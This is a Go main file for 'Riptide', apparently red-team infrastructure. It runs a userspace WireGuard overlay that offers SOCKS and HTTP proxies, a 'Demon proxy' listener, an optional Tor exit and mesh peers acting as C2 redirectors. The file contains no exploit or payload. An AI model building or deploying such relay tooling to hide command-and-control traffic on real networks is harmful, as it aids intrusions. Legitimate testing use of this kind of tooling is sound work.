package main

import (
	"flag"
	"log"
	"net/netip"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"golang.zx2c4.com/wireguard/conn"
	"golang.zx2c4.com/wireguard/device"
	"golang.zx2c4.com/wireguard/tun/netstack"
)

func main() {
	cfgPath := flag.String("config", "peer.conf", "wireguard conf (hub or peer)")
	httpBind := flag.String("http", "", "override [Riptide] HTTP (Demon proxy)")
	socksBind := flag.String("socks", "", "override [Riptide] local SOCKS")
	c2 := flag.String("c2", "", "override C2 host:port list (comma)")
	c2via := flag.String("c2-via", "", "overlay dest for C2 (default 10.66.0.1:443)")
	flag.Parse()
	if maybeService(*cfgPath) {
		return
	}
	runAgent(*cfgPath, extraFlags{*httpBind, *socksBind, *c2, *c2via})
}

type extraFlags struct {
	http, socks, c2, c2via string
}

func runAgent(cfgPath string, ov extraFlags) {
	log.SetFlags(log.LstdFlags | log.Lmsgprefix)
	log.SetPrefix("riptide ")

	c, err := loadConf(cfgPath)
	if err != nil {
		log.Fatalf("conf: %v", err)
	}
	if ov.http != "" {
		c.Riptide.HTTP = ov.http
	}
	if ov.socks != "" {
		c.Riptide.SOCKS = ov.socks
	}
	if ov.c2 != "" {
		c.Riptide.C2 = ov.c2
	}
	if ov.c2via != "" {
		c.Riptide.C2Via = ov.c2via
	}

	dns := []netip.Addr{netip.MustParseAddr("10.66.0.1"), netip.MustParseAddr("1.1.1.1")}
	if c.Riptide.DNS != "" {
		if a, err := netip.ParseAddr(c.Riptide.DNS); err == nil {
			dns = []netip.Addr{a, netip.MustParseAddr("1.1.1.1")}
		}
	}
	tun, tnet, err := netstack.CreateNetTUN(
		[]netip.Addr{c.Iface.Address},
		dns,
		1420,
	)
	if err != nil {
		log.Fatalf("tun: %v", err)
	}

	level := device.LogLevelError
	dev := device.NewDevice(tun, conn.NewDefaultBind(), device.NewLogger(level, "wg "))
	if err := dev.IpcSet(c.ipc()); err != nil {
		log.Fatalf("ipc: %v", err)
	}
	if err := dev.Up(); err != nil {
		log.Fatalf("up: %v", err)
	}

	role := "peer"
	if c.isHub() {
		role = "hub"
	}

	httpBind := c.Riptide.HTTP
	if httpBind == "" {
		httpBind = "127.0.0.1:8080"
	}
	socksBind := c.Riptide.SOCKS
	if socksBind == "" {
		socksBind = "127.0.0.1:1080"
	}
	c2via := c.Riptide.C2Via
	if c2via == "" {
		c2via = "10.66.0.1:443"
	}
	ctrl := c.Riptide.Control
	if ctrl == "" {
		ctrl = "127.0.0.1:7670"
	}
	allow := map[string]bool{}
	for _, a := range splitComma(c.Riptide.Allow) {
		allow[a] = true
	}
	e := &engine{
		tnet:    tnet,
		overlay: c.Iface.Address,
		c2:      splitComma(c.Riptide.C2),
		c2Via:   c2via,
		allow:   allow,
		shields: c.Riptide.Shields,
		tor:     c.Riptide.Tor,
		dns:     c.Riptide.DNS,
	}
	if c.Riptide.Exit != "" {
		e.setExit(c.Riptide.Exit)
	}

	if err := serveSOCKSOverlay(e, tnet, 1080); err != nil {
		log.Fatalf("socks overlay: %v", err)
	}

	log.Printf("%s overlay=%s socks=:1080 (userspace, no WinTUN)", role, c.Iface.Address)
	if c.Riptide.Tor {
		log.Printf("tor-exit 127.0.0.1:9050")
	}

	if err := serveConnect(tnet, "127.0.0.1:7668", "10.66.0.1:7668"); err != nil {
		log.Printf("connect gui 127.0.0.1:7668: %v (use SSH -L if you are the admin box)", err)
	} else {
		log.Printf("connect http://127.0.0.1:7668/ -> 10.66.0.1:7668")
	}
	if err := serveHTTPHost(e, httpBind); err != nil {
		log.Printf("http %s: %v", httpBind, err)
	}
	if err := serveHTTPOverlay(e, tnet, 8080); err != nil {
		log.Printf("http overlay :8080: %v", err)
	} else {
		log.Printf("http overlay :8080  (other mesh peers as C2 redirector)")
	}
	if err := serveSOCKSHost(e, socksBind); err != nil {
		log.Printf("socks %s: %v", socksBind, err)
	} else if socksBind != "off" {
		log.Printf("socks %s  (operator / GUI exit)", socksBind)
	}
	if err := serveControl(e, ctrl, httpBind, socksBind, splitComma(c.Riptide.Routes)); err != nil {
		log.Printf("control %s: %v", ctrl, err)
	} else if ctrl != "off" {
		log.Printf("control %s", ctrl)
	}
	servePorts(tnet, parseServe(c.Riptide.Serve))
	if len(e.c2) > 0 {
		log.Printf("c2-via %s  hosts=%v", e.c2Via, e.c2)
	}
	if e.shields {
		log.Printf("shields on  allow=%v", keys(allow))
	}
	go hubRotate(dev, c)

	go func() {
		t := time.NewTicker(30 * time.Second)
		defer t.Stop()
		for range t.C {
			dump, err := dev.IpcGet()
			if err != nil {
				continue
			}
			if hs := lastHandshake(dump); hs != "" {
				log.Printf("handshake %s", hs)
			}
		}
	}()

	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
	<-ch
	_ = dev.Down()
	dev.Close()
}

func lastHandshake(ipc string) string {
	// ipc dump is key=value lines; last_handshake_time_sec > 0 means live
	best := ""
	for _, line := range splitLines(ipc) {
		if len(line) > 24 && line[:24] == "last_handshake_time_sec=" {
			best = line[24:]
		}
	}
	if best == "" || best == "0" {
		return ""
	}
	return best
}

func splitComma(s string) []string {
	if s == "" {
		return nil
	}
	out := []string{}
	for _, p := range strings.Split(s, ",") {
		p = strings.TrimSpace(p)
		if p != "" {
			out = append(out, p)
		}
	}
	return out
}

func keys(m map[string]bool) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

func splitLines(s string) []string {
	out := []string{}
	start := 0
	for i := 0; i < len(s); i++ {
		if s[i] == '\n' {
			out = append(out, s[start:i])
			start = i + 1
		}
	}
	if start < len(s) {
		out = append(out, s[start:])
	}
	return out
}


